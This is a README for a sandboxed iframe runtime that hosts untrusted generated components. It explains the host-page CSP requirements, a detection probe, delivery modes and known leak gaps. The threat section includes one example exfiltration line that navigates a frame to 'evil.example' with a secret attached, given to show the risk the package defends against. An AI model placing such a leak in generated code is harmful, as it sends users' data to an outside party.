# @wengu/runtime

Runs untrusted, generated components in a sandboxed iframe (`sandbox="allow-scripts"`, opaque origin, strict frame
CSP) and talks to them over a validated `MessageChannel` protocol. Entry points: `ComponentHost` (plain DOM) and
`SandboxedComponent` (`@wengu/runtime/react`).

## Must-knows for an embedding app

### 1. The page that embeds components must send the host CSP

A component can leak data by navigating its *own* frame, e.g. `location.href = 'https://evil.example/?d=' + secret`.
Neither the iframe sandbox nor the frame's CSP can stop that (CSP has no directive for a document's own navigations).
The only thing that does is the `frame-src` of the **embedding page**. Without it, the request reaches the attacker
before the host can react (`tests/navigation.spec.ts`, "UNPROTECTED CONTROL").

```ts
import { hostPageCsp } from '@wengu/runtime';

// srcdoc delivery only:
hostPageCsp();                                                        // "frame-src 'self'"
// url delivery:
hostPageCsp({ sandboxOrigin: 'https://sandbox.example-usercontent.com' });
// "frame-src 'self' https://sandbox.example-usercontent.com"
```

Send it as its own `Content-Security-Policy` response header on the page (preferred), or as
`<meta http-equiv="Content-Security-Policy">` as the first element of `<head>`. If the app already has a CSP, sending this
as an additional policy is safe: browsers enforce all policies, so it can only tighten. Every origin the policy allows
is somewhere a component can navigate to, so only list origins you operate. The demo and test harness get it from
`vite.config.ts`.

`ComponentHost` checks for it at startup (`hostCspCheck`):

| value | behaviour on an unprotected page |
| --- | --- |
| `'warn'` (default) | component loads; `console.error("[wengu/runtime] UNSAFE HOST PAGE ...")` and an `unprotected` event |
| `'enforce'` | component is never loaded; `unprotected` + `error` events, status `error` |
| `'off'` | no check (only where navigation is blocked outside the page, e.g. Electron `will-frame-navigate`) |

`checkHostNavigationProtection()` runs the same check on its own.

How the check works: it points a hidden, fully sandboxed iframe at `https://wengu-csp-probe.invalid:1/` and waits for
the browser's enforced `frame-src` violation (a few ms when protected). If the page is unprotected, the probe still
contacts nothing (port 1 is blocked locally by the browser). On a protected page the browser logs one
"Framing ... violates ... frame-src" console message for the probe; that is expected.

What it cannot detect: page script cannot read a header CSP, so the check only shows that *some* enforced policy blocks
an arbitrary external https origin. It cannot tell whether every origin the policy allows is trustworthy (e.g.
`frame-src 'self' https://*.cdn.example` passes), it ignores report-only policies (they block nothing), and it cannot see
protection that lives outside the page (Electron, extensions, enterprise policy). In `'warn'` mode the component starts
before the result is known, so the check reports, it does not prevent.

### 2. Delivery modes

- `srcdoc` (default): no extra server. The frame **inherits the host page's entire CSP** in addition to its own, so a
  host CSP that restricts `script-src`, `worker-src` etc. will break components. In Chromium the frame usually shares the
  host's renderer process, so a busy component can freeze the host.
- `url`: the sandbox document (`generated/sandbox.html`) is served from a dedicated origin on a different *site* from the
  app (different registrable domain; another port is not enough), with the headers from `scripts/sandbox-server.mjs`:
  the frame CSP, `sandbox allow-scripts`, and `frame-ancestors` limited to the app. The frame then gets its own process.

### 3. Known gaps (not solved here)

- WebRTC (STUN/TURN) can send data out despite the CSP in Chromium; needs browser/Electron-level controls
  (`tests/webrtc-dns.spec.ts`).
- A component's `result` in review mode cannot be told apart from a forged one; only the first is accepted
  (`tests/protocol.spec.ts`).

## Commands

Run from this directory with `corepack pnpm <script>` (or from the repo root: `corepack pnpm test` / `typecheck` run all
packages).

- `dev`: demo at http://localhost:5173 (`?delivery=url` needs `sandbox-server` running)
- `sandbox-server`: sandbox origin at http://127.0.0.1:5174/sandbox.html
- `test`: Playwright (headless Chromium, `channel: 'chromium'`; starts both servers)
- `typecheck`, `measure:jank` (needs both servers running)
